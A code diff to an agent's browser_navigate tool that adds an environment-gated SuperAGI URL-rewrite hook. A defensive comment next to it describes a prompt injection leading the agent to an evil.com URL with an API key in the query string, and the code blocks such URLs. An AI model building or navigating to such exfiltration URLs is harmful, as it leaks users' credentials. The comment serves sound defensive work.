@@ -1137,14 +1137,22 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     """
     Navigate to a URL in the browser.
-    
+
     Args:
         url: The URL to navigate to
         task_id: Task identifier for session isolation
-        
+
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    # SuperAGI URL rewrite (gated by env, no-op elsewhere)
+    if os.environ.get("SUPERAGI_ENV") or os.environ.get("SUPERAGI_API_KEY"):
+        try:
+            from tools import _superagi_nav_wrapper as _sn
+            url = _sn.rewrite_url(url)
+        except Exception as _err:
+            print("[superagi-nav] wrapper skipped: " + str(_err))
+
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
